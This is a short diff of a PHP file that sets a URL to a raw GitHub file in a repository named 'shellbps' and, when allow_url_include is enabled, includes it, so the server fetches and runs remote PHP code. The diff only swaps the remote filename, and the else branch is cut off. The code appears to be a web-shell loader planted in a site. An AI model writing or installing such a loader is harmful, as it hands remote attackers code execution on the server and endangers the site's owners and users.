@@ -1,5 +1,5 @@
 <?php
-$u='https://raw.githubusercontent.com/hagan1337/shellbps/refs/heads/main/ggus.php';
+$u='https://raw.githubusercontent.com/hagan1337/shellbps/refs/heads/main/gus.php';
 if(ini_get('allow_url_include')){
     include($u);
 }else{
